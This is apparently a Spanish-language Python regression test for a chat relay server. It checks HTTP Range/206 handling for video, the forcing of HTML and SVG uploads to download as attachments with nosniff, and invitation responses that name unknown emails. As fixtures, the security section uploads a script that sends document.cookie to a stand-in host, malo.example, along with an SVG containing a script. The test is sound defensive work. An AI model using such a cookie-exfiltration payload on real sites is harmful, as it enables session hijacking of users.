#!/usr/bin/env python3
"""Prueba de los tres agujeros del relevo que se veían desde la pantalla.

Los tres eran de esos que no rompen ninguna prueba y sin embargo el usuario
los sufre todos los días:

  1. EL VIDEO QUE NO SE VEÍA EN EL IPHONE. GET /archivo/<id> contestaba
     siempre 200 con el archivo entero. Safari —o sea, el navegador de casi
     todo este público— no reproduce un <video> así: pide un trozo con
     `Range` y espera un 206 Partial Content. Un video mandado por el chat
     se veía en la app y NO se veía en la web, sin un solo error en ningún
     log. Aquí se fija que el 206 llega, que trae el trozo exacto y byte a
     byte igual, y que sin Range sigue saliendo el 200 de toda la vida.

  2. NUESTRO DOMINIO ALOJANDO PHISHING. El mismo GET servía CUALQUIER mime
     como `inline`: bastaba subir un .html (o un .svg, que es XML con
     <script>) como adjunto para tener una página propia corriendo dentro de
     cerebro.ordenscan.com, con la barra de direcciones de la casa dándole
     credibilidad. Ahora solo van inline imagen y video —lo que la burbuja
     tiene que enseñar—; todo lo demás baja como `attachment` y con
     `X-Content-Type-Options: nosniff` para que el navegador tampoco adivine.

  3. «INVITACIÓN ENVIADA» A NADIE. /grupo/invitar se saltaba en silencio a
     quien todavía no está dado de alta en el relevo y devolvía 200. La
     pantalla, que no tenía cómo distinguirlo, decía «invitación enviada» y
     la persona se quedaba esperando a alguien que jamás fue invitado. Ahora
     la respuesta dice qué le pasó a cada correo, y el caso «ese correo no
     existe» se distingue del caso «entró» sin adivinar nada.

Si alguien deshace cualquiera de las tres, esta prueba tiene que fallar.

Sin dependencias fuera de la stdlib.
"""
import base64, json, os, socket, subprocess, sys, tempfile, time
import urllib.error, urllib.request

AQUI = os.path.dirname(os.path.abspath(__file__))
SERVIDOR = os.path.join(AQUI, '..', 'servidor.py')

# opener sin proxy: la máquina de pruebas puede tener HTTPS_PROXY global y
# esto habla con 127.0.0.1 directamente
ABRIR = urllib.request.build_opener(urllib.request.ProxyHandler({})).open


def puerto_libre():
    with socket.socket() as s:
        s.bind(('127.0.0.1', 0))
        return s.getsockname()[1]


def post(base, ruta, cuerpo):
    """POST JSON → (status, dict). Los errores HTTP también traen JSON."""
    pet = urllib.request.Request(base + ruta, data=json.dumps(cuerpo).encode(),
                                 headers={'Content-Type': 'application/json'})
    try:
        with ABRIR(pet, timeout=10) as r:
            return r.status, json.loads(r.read() or b'{}')
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read() or b'{}')


def bajar(base, iid, rango=None):
    """GET /archivo/<id> → (status, headers, bytes). El 416 también se mira."""
    pet = urllib.request.Request(base + '/archivo/' + iid)
    if rango:
        pet.add_header('Range', rango)
    try:
        with ABRIR(pet, timeout=10) as r:
            return r.status, r.headers, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.headers, e.read()


def subir(base, firma, nombre, tipo, mime, datos):
    st, r = post(base, '/subir', dict(firma, nombre=nombre, tipo=tipo, mime=mime,
                                      datos=base64.b64encode(datos).decode()))
    assert st == 200 and len(r.get('id', '')) == 32, \
        'no se pudo subir %s: %s %s' % (nombre, st, r)
    return r['id']


def main():
    carpeta = tempfile.mkdtemp(prefix='relevo-rangos-')
    p = puerto_libre()
    base = 'http://127.0.0.1:%d' % p
    env = dict(os.environ,
               MENSAJES_DATOS=os.path.join(carpeta, 'datos.json'),
               MENSAJES_ARCHIVOS=os.path.join(carpeta, 'archivos'),
               MENSAJES_PUERTO=str(p))
    for k in ('HTTP_PROXY', 'HTTPS_PROXY', 'http_proxy', 'https_proxy'):
        env.pop(k, None)
    relevo = subprocess.Popen([sys.executable, SERVIDOR], env=env,
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        # esperar a que el relevo respire
        for _ in range(50):
            try:
                with ABRIR(base + '/salud', timeout=2) as r:
                    if json.loads(r.read()).get('vivo'):
                        break
            except OSError:
                time.sleep(0.1)
        else:
            raise SystemExit('el servidor nunca contestó /salud')

        st, a = post(base, '/alta', {'correo': 'ana@prueba.local', 'nombre': 'Ana'})
        assert st == 200 and a.get('llave'), 'alta de Ana: %s %s' % (st, a)
        st, b = post(base, '/alta', {'correo': 'beto@prueba.local', 'nombre': 'Beto'})
        assert st == 200 and b.get('llave'), 'alta de Beto: %s %s' % (st, b)
        ana = {'correo': 'ana@prueba.local', 'llave': a['llave']}
        beto = {'correo': 'beto@prueba.local', 'llave': b['llave']}

        # ═══ 1 · el video del iPhone ═════════════════════════════════════
        # 4KB con un patrón que cambia en cada byte: si el trozo se sirviera
        # corrido aunque fuera un byte, la comparación lo canta
        video = bytes((i * 7 + i // 251) % 256 for i in range(4096))
        vid = subir(base, ana, 'clip.mp4', 'video', 'video/mp4', video)

        # sin Range: el 200 de siempre, entero, y avisando de que sabe recortar
        st, h, cuerpo = bajar(base, vid)
        assert st == 200, 'sin Range debía seguir dando 200, dio %s' % st
        assert cuerpo == video, 'el archivo entero no llegó igual (%d de %d)' % (len(cuerpo), len(video))
        assert h.get('Accept-Ranges') == 'bytes', \
            "el 200 no anuncia 'Accept-Ranges: bytes' y el reproductor ni lo intenta: %r" % h.get('Accept-Ranges')
        assert h.get('Content-Range') is None, 'un 200 no lleva Content-Range: %r' % h.get('Content-Range')

        # el trozo del medio: 206, cabecera exacta y bytes idénticos
        st, h, cuerpo = bajar(base, vid, 'bytes=100-199')
        assert st == 206, 'con Range hacía falta un 206, dio %s' % st
        assert h.get('Content-Range') == 'bytes 100-199/4096', \
            'Content-Range mal: %r' % h.get('Content-Range')
        assert h.get('Content-Length') == '100', \
            'Content-Length no es el del trozo: %r' % h.get('Content-Length')
        assert cuerpo == video[100:200], 'el trozo 100-199 NO es byte a byte el pedido'

        # el primer byte suelto: así arranca Safari a tantear el archivo
        st, h, cuerpo = bajar(base, vid, 'bytes=0-0')
        assert st == 206 and cuerpo == video[:1] and h.get('Content-Range') == 'bytes 0-0/4096', \
            'el tanteo inicial de un byte falló: %s %r %d' % (st, h.get('Content-Range'), len(cuerpo))

        # rango abierto por la derecha ('de aquí al final')
        st, h, cuerpo = bajar(base, vid, 'bytes=4000-')
        assert st == 206 and cuerpo == video[4000:], 'el rango abierto no llegó entero: %d' % len(cuerpo)
        assert h.get('Content-Range') == 'bytes 4000-4095/4096', \
            'el rango abierto se cerró mal: %r' % h.get('Content-Range')

        # sufijo: los últimos N bytes (así se busca el índice de un mp4)
        st, h, cuerpo = bajar(base, vid, 'bytes=-64')
        assert st == 206 and cuerpo == video[-64:], 'los últimos 64 bytes no coinciden'
        assert h.get('Content-Range') == 'bytes 4032-4095/4096', \
            'el sufijo dio otro Content-Range: %r' % h.get('Content-Range')

        # un final más allá del archivo se recorta, no revienta
        st, h, cuerpo = bajar(base, vid, 'bytes=4090-999999')
        assert st == 206 and cuerpo == video[4090:], 'el final pasado no se recortó: %s %d' % (st, len(cuerpo))
        assert h.get('Content-Range') == 'bytes 4090-4095/4096', \
            'el recorte del final dio: %r' % h.get('Content-Range')

        # y lo que no existe se dice con un 416 que trae el tamaño de verdad
        st, h, cuerpo = bajar(base, vid, 'bytes=9000-9100')
        assert st == 416, 'pedir un trozo que no existe debía dar 416, dio %s' % st
        assert h.get('Content-Range') == 'bytes */4096', \
            'el 416 tiene que decir el tamaño real: %r' % h.get('Content-Range')
        st, h, _ = bajar(base, vid, 'bytes=200-100')
        assert st == 416, 'un rango al revés debía dar 416, dio %s' % st

        # una cabecera que no entendemos (varios trozos) NO es un error: la
        # norma dice ignorarla, y el archivo entero es una respuesta válida
        st, h, cuerpo = bajar(base, vid, 'bytes=0-9,20-29')
        assert st == 200 and cuerpo == video, \
            'un Range incomprensible debía devolver el archivo entero, dio %s (%d bytes)' % (st, len(cuerpo))

        # ═══ 2 · nadie ejecuta su HTML en nuestro dominio ═════════════════
        veneno = b'<script>fetch("https://malo.example/"+document.cookie)</script>'
        html = subir(base, beto, 'factura.html', 'archivo', 'text/html', veneno)
        st, h, cuerpo = bajar(base, html)
        assert st == 200 and cuerpo == veneno, 'el .html no se sirvió igual: %s' % st
        disp = h.get('Content-Disposition', '')
        assert disp.startswith('attachment'), \
            'un .html servido inline es phishing alojado por nosotros: %r' % disp
        assert h.get('X-Content-Type-Options') == 'nosniff', \
            'falta nosniff: sin él el navegador adivina el tipo igual: %r' % h.get('X-Content-Type-Options')

        # el SVG es XML con <script> dentro: NO cuenta como imagen
        svg = subir(base, beto, 'logo.svg', 'imagen', 'image/svg+xml',
                    b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>')
        st, h, _ = bajar(base, svg)
        assert h.get('Content-Disposition', '').startswith('attachment'), \
            'el SVG inline ejecuta script en nuestro dominio: %r' % h.get('Content-Disposition')

        # pero una imagen de verdad SIGUE viéndose dentro del hilo
        png = base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8'
                               'z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==')
        img = subir(base, ana, 'foto.png', 'imagen', 'image/png', png)
        st, h, cuerpo = bajar(base, img)
        assert st == 200 and cuerpo == png, 'la imagen no llegó igual: %s' % st
        assert h.get('Content-Disposition', '').startswith('inline'), \
            'la foto tiene que pintarse en la burbuja, no bajarse: %r' % h.get('Content-Disposition')
        assert h.get('X-Content-Type-Options') == 'nosniff', 'a la imagen también le toca nosniff'

        # y el video igual: sin inline no hay reproductor que valga
        st, h, _ = bajar(base, vid)
        assert h.get('Content-Disposition', '').startswith('inline'), \
            'el video tiene que ir inline para reproducirse: %r' % h.get('Content-Disposition')

        # ═══ 3 · invitar a quien no existe no es invitar ══════════════════
        st, g = post(base, '/grupo/crear', dict(ana, nombre='Junta'))
        assert st == 200 and g.get('id'), 'no se creó el grupo: %s %s' % (st, g)
        gid = g['id']

        # alguien que SÍ está dado de alta: entra, y se dice quién
        st, r = post(base, '/grupo/invitar', dict(ana, id=gid, correos=['beto@prueba.local']))
        assert st == 200 and r.get('añadidos') == 1, 'Beto tenía que entrar: %s %s' % (st, r)
        assert r.get('agregados') == 1, "falta el alias sin eñe 'agregados': %s" % r
        assert r.get('entraron') == ['beto@prueba.local'], 'no dice quién entró: %s' % r
        assert not r.get('noExisten'), 'Beto existe y aparece como inexistente: %s' % r

        # alguien que NO está en el relevo: 200, pero la respuesta lo canta
        st, r = post(base, '/grupo/invitar', dict(ana, id=gid, correos=['nadie@prueba.local']))
        assert st == 200, 'invitar a un desconocido no es un error de protocolo: %s' % st
        assert r.get('añadidos') == 0, \
            'contó como añadido a alguien que no entró — de ahí salía «invitación enviada»: %s' % r
        assert r.get('noExisten') == ['nadie@prueba.local'], \
            'no hay forma de saber que ese correo no existe: %s' % r
        assert r.get('entraron') == [], 'dice que entró alguien que no entró: %s' % r

        # y el grupo no se movió: nadie fantasma dentro
        st, info = post(base, '/grupo/info', dict(ana, id=gid))
        assert st == 200 and sorted(m['correo'] for m in info['miembros']) == \
            ['ana@prueba.local', 'beto@prueba.local'], \
            'entró un miembro fantasma: %s' % info['miembros']

        # invitar de nuevo a quien ya está tampoco es «invitación enviada»
        st, r = post(base, '/grupo/invitar', dict(ana, id=gid, correos=['beto@prueba.local']))
        assert st == 200 and r.get('añadidos') == 0 and r.get('yaEstaban') == ['beto@prueba.local'], \
            'a quien ya estaba se le vuelve a contar como añadido: %s' % r

        # los tres casos en una sola llamada, cada uno en su sitio
        st, r = post(base, '/grupo/invitar', dict(beto, id=gid, correos=[
            'beto@prueba.local', 'nadie@prueba.local', 'esto no es un correo']))
        assert st == 200 and r.get('añadidos') == 0, 'no había a quién añadir: %s' % r
        assert r.get('yaEstaban') == ['beto@prueba.local'] \
            and r.get('noExisten') == ['nadie@prueba.local'] \
            and r.get('invalidos') == 1, 'los casos se mezclaron: %s' % r

        # y lo de siempre sigue: del grupo ajeno no se invita
        st, otro = post(base, '/grupo/crear', dict(beto, nombre='Solo Beto'))
        st, r = post(base, '/grupo/invitar', dict(ana, id=otro['id'], correos=['ana@prueba.local']))
        assert st == 403, 'Ana invitó a un grupo del que no es: %s %s' % (st, r)

        print('TODO BIEN: el video se sirve por trozos con 206 byte a byte exacto y sin Range '
              'sigue el 200, el .html y el .svg bajan como descarga mientras la imagen y el video '
              'siguen inline, y invitar a quien no existe ya no se puede confundir con invitar de verdad.')
        return 0
    finally:
        relevo.terminate()
        relevo.wait(timeout=5)


if __name__ == '__main__':
    sys.exit(main())
